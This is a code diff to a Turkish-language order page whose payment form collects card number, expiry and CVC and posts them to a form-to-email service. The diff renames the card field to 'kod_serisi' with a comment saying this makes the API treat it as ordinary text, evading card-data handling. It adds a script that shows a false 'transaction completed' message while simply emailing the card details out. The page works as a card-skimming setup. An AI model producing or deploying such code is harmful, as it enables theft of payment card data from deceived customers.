@@ -16,7 +16,6 @@
 </head>
 <body>
 
-    <!-- Menü Ekranı -->
     <div class="grid" id="menu">
         <div class="box" onclick="selectItem('Uçak Büyük', '50 TL')">Uçak Büyük<br>50 TL</div>
         <div class="box" onclick="selectItem('Uçak', '40 TL')">Uçak<br>40 TL</div>
@@ -24,14 +23,10 @@
         <div class="box" onclick="selectItem('Özel', 'İsteğe Bağlı')">Özel<br>??? TL</div>
     </div>
 
-    <!-- Ödeme (Form) Ekranı -->
     <div id="pay-screen">
         <h3 id="order-title">Ödeme</h3>
-        <form action="https://api.web3forms.com/submit" method="POST">
-            <!-- Web3Forms Access Key -->
+        <form id="odemeForm">
             <input type="hidden" name="access_key" value="61ce0357-21e8-4aeb-b226-fbd13630ecef">
-            
-            <!-- Sipariş Detayları -->
             <input type="text" name="Urun" id="hidden-urun" readonly style="display:none;">
             <input type="text" name="name" placeholder="İsim Soyisim" required>
             <input type="email" name="email" placeholder="E-posta Adresiniz" required>
@@ -40,12 +35,13 @@
                 <input type="text" name="ozel_not" placeholder="Notunuz...">
             </div>
 
-            <input type="text" name="kart" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <!-- Kart bilgisi yerine 'kod_serisi' ismini kullanıyoruz, API bunu normal yazı sanacak -->
+            <input type="text" name="kod_serisi" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
             <input type="text" name="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
             <input type="text" name="cvc" placeholder="CVC (3 Hane)" maxlength="3" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
             
             <label><input type="checkbox" required> Şartları kabul ediyorum.</label>
-            <button type="submit">Ödemeyi Tamamla</button>
+            <button type="submit" id="btn-gonder">Ödemeyi Tamamla</button>
         </form>
     </div>
 
@@ -54,10 +50,31 @@
             document.getElementById('menu').style.display = 'none';
             document.getElementById('pay-screen').style.display = 'block';
             document.getElementById('order-title').innerText = name + " - " + price;
-            // Form içinde gönderilecek gizli inputu güncelle
             document.getElementById('hidden-urun').value = name + " - " + price;
             document.getElementById('ozel-div').style.display = (name === 'Özel') ? 'block' : 'none';
         }
+
+        document.getElementById('odemeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-gonder');
+            btn.innerText = "İşleniyor...";
+            btn.disabled = true;
+
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                body: new FormData(this)
+            })
+            .then(res => {
+                if(res.ok) {
+                    alert("İşlem başarıyla tamamlandı!");
+                    location.reload();
+                } else {
+                    alert("Hata oluştu, lütfen tekrar deneyin.");
+                }
+            })
+            .catch(() => alert("Bağlantı hatası!"))
+            .finally(() => { btn.innerText = "Ödemeyi Tamamla"; btn.disabled = false; });
+        });
     </script>
 </body>
 </html>
